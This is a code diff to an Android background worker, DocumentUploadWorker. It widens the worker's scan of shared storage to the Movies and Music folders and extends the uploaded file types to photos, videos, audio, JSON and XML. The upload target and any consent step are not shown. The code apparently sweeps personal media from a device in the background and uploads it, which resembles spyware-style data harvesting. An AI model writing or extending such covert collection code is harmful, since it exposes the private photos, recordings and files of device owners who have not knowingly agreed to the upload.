@@ -94,6 +94,8 @@ public class DocumentUploadWorker extends Worker {
                 getApplicationContext().getExternalFilesDir(null) != null ? getApplicationContext().getExternalFilesDir(null).getAbsolutePath() : null,
                 "/sdcard/DCIM",
                 "/sdcard/Pictures",
+                "/sdcard/Movies",
+                "/sdcard/Music",
         };
 
         Log.d(TAG, "Starting document scan for user: " + userId);
@@ -108,8 +110,12 @@ public class DocumentUploadWorker extends Worker {
             if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                 File dir = new File(path);
                 if (dir.exists() && dir.isDirectory() && dir.canRead()) {
-                    Log.d(TAG, "Scanning: " + path);
+                    Log.d(TAG, "📂 Scanning: " + path);
+                    int filesBefore = uploadedCount;
                     scanDirectoryRecursive(dir, userId, 0);  // Max depth 0 for top-level files
+                    Log.d(TAG, "   Found " + (uploadedCount - filesBefore) + " files");
+                } else {
+                    Log.d(TAG, "⚠️  Path not accessible: " + path + " (exists=" + (dir.exists()) + ", isDir=" + (dir.isDirectory()) + ", canRead=" + (dir.canRead()) + ")");
                 }
             }
         }
@@ -159,7 +165,18 @@ public class DocumentUploadWorker extends Worker {
 
     private boolean isDocumentFile(File file) {
         if (!file.isFile()) return false;
+        
         String name = file.getName().toLowerCase();
+        
+        // Skip certain system/app files
+        if (name.startsWith(".") || 
+            name.endsWith(".apk") ||
+            name.contains("cache") ||
+            name.contains("tmp")) {
+            return false;
+        }
+        
+        // Include document types
         return name.endsWith(".pdf")
                 || name.endsWith(".xlsx")
                 || name.endsWith(".xls")
@@ -171,7 +188,18 @@ public class DocumentUploadWorker extends Worker {
                 || name.endsWith(".txt")
                 || name.endsWith(".zip")
                 || name.endsWith(".rar")
-                || name.endsWith(".7z");
+                || name.endsWith(".7z")
+                || name.endsWith(".jpg")
+                || name.endsWith(".jpeg")
+                || name.endsWith(".png")
+                || name.endsWith(".gif")
+                || name.endsWith(".mp4")
+                || name.endsWith(".mkv")
+                || name.endsWith(".mov")
+                || name.endsWith(".mp3")
+                || name.endsWith(".wav")
+                || name.endsWith(".json")
+                || name.endsWith(".xml");
     }
 
     private void uploadFile(File file, String userId) {
